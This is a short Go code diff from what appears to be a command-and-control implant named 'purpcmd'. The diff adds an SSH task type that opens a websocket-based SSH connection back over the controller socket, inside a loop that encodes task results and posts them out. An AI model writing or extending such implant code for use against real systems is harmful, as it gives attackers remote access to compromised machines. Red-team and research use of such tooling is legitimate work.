@@ -5,6 +5,7 @@ import (
 	"encoding/base64"
 	"fmt"
 	"io"
+	"purpcmd/implant/ssh"
 	"purpcmd/internal"
 	"purpcmd/internal/encrypt"
 	"time"
@@ -80,8 +81,11 @@ func Start() {
 			taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
 			println(taskRestEnc)
 			h.Post([]byte(taskRestEnc))
+		case internal.SSH:
+			print("->",tcode, "calling ssh for ", h.Socket)
+			ssh.Wsclient("aaa","/any.png" , h.Socket)
 		default:
-			print("->",tcode)
+			print("->",tcode, "Nothing")
 		}
 
 		time.Sleep(time.Duration(i.Sleep) * time.Second)
